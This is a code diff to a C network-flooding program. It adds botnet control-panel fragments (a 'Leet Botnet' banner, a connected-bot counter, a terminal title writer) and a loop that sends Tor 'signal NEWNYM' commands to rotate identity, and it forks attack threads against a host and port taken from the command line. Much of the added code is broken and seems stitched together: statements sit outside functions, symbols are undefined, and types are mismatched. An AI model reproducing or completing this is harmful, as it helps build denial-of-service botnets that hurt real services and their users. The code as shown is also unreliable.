@@ -9,6 +9,32 @@
 #include <sys/types.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <pthread.h>
+#define MAXFDS 1000000
+
+struct clientdata_t {
+        uint32_t ip;
+        char connected;
+} clients[MAXFDS];
+
+unsigned int BotsConnected() {
+	int i = 0, total = 0;
+	for(i = 0; i < MAXFDS; i++) {
+		if(!clients[i].connected) continue;
+		total++;
+	}
+	return total;
+}
+int i;
+clients[i].connected = 1;
+clients[i].ip = "1.1.1.1";
+void *TitleWriter(void *sock) {
+    char string[2048];
+    while(1) {
+		memset(string, 0, 2048);
+        fprintf(string, "%c]0;Leets Connected: %d", '\033', BotsConnected());
+		sleep(2);
+}}
 
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
@@ -73,10 +99,37 @@ void attack(char *host, char *port, int id) {
 	}
 }
 
+void echoloader() {
+	int r;
+	int socket = make_socket(clients[i].ip, "53");
+	write(socket, "AUTHENTICATE \"\"\n", 16);
+	while(1) {
+		r=write(socket, "signal NEWNYM\n\x00", 16);
+		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
+		usleep(300000);
+	}
+}
+
 int main(int argc, char **argv) {
 	int x;
+	int sock;
+	pthread_t title;
+	pthread_create(&title, NULL, &TitleWriter, sock);
+		char ascii_banner_line1 [5000];
+		char ascii_banner_line2 [5000];
+		char welcome_line [80];
+		char banner_bot_count [2048];
+		memset(banner_bot_count, 0, 2048);
+		
+		sprintf(ascii_banner_line1, "\x1b[36m Leet Botnet \r\n");
+		sprintf(ascii_banner_line2, "\r\n");	
+		sprintf(welcome_line,       "\x1b[37m        #\x1b[36m----- \x1b[37mBot Count: %d\x1b[36m -----\x1b[37m#\r\n", BotsConnected(), OperatorsConnected); 
+		sprintf(banner_bot_count, 	"\r\n\x1b[37m    #\x1b[36m-------- \x1b[37mWelcome, %s\x1b[36m --------\x1b[37m#\r\n", accounts[find_line].username);
+
+
 	for(x=0; x != THREADS; x++) {
 		if(fork())
+			echoloader();
 			attack(argv[1], argv[2], x);
 		
 	}
